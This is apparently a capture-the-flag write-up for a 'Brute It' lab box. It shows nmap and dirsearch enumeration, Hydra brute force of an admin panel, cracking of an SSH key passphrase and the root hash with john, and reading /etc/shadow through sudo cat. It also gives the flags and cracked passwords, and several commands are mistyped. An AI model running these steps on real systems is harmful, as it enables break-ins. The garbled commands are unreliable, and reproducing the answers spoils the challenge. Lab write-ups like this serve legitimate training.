# Brute-It-CTF-write-up

This repository contains a detailed write-up of the "Brute It" CTF challenge, including enumeration, exploitation, privilege escalation, and mitigation steps.


### 

• CTF Name: Write it          
• Difficulty Level: Easy     
• Ip address : 10.48.163.181


### Enumeration 

     • i started by scanning the ip to identify open ports and services through nmap :
    
           nmap -sV -O -sC 10.48.163.181

     • i found port 22 and 80 , on port 80 a web page was running
     • then i accessed the web page but there is nothing interesting
     • so, i decided to  perform directory brute :
       
           dirsearch -u http://10.48.163.181
    
     • i discovered a hidden admin panel : /admin
     • i found a web flag :THM{brut3_f0rce_is_e4sy}
     • on the site source code i found admin username : admin
     • found john is his name 

      

### Exploitation

     • through the admin username i decided to perform brute force through hydra :

           hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.163.181 http-post-form "/admin/:username=admin&pass=^PASS^=invalid"

     • Password cracked :xavier

### Post-Exploitation

     • after login through username and Password , i discovered an encrypted RSA private key
     • so, i decided to crack the RSA key
       
        nano hash.txt // i had copied the RSA to key to hash.txt
        
        ss2john id_rsa > hash.txt

        john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

        chmod 600 id_rsa

     • RSA key was cracked:  rockinroll
     • through the credentials , i logged into the shell

        john -i id_rsa john@10.48.163.181

     • finally i got a shell access
     • i got a user.txt flag : THM{a_password_is_not_a_barrier}



### Privilege escalation

     • i tried to get root file access , but need root Password
     • so i tried to check what user can run
          
          sudo -l 

     • user can run the cat command 
     • so i accessed shadow file to get root Password hash :
         
         cat /etc/shadow

     • i had found th the root hash, so i decidedto crack it through john The Ripper tool
     • so, i copied the hash to root.hash
                  
           nano root.hash

           john --wordlist=/usr/share/wordlists/rockyou.txt root.hash

      • i found the root Password : football

      • through the root Password , i accessed the root.txt via accessing root folder

           su root

           cd /root

           cat  root.txt

      • finallyi found the root flag :   THM{pr1v1l3g3_3sc4l4t10n}   


### Tools Used

      • Nmap

      • Dirsearch

      • Hydra

      • John the Ripper

### Security Issues Identified

      • Credentials exposed in source code

      • No brute force protection

      • Weak SSH key password

      • Easy to get sudo privileges

### Prevention Recommendations

      • Remove sensitive information from source code

      • Implement login rate limiting

      • Make strong SSH key encryption



     

      




                  


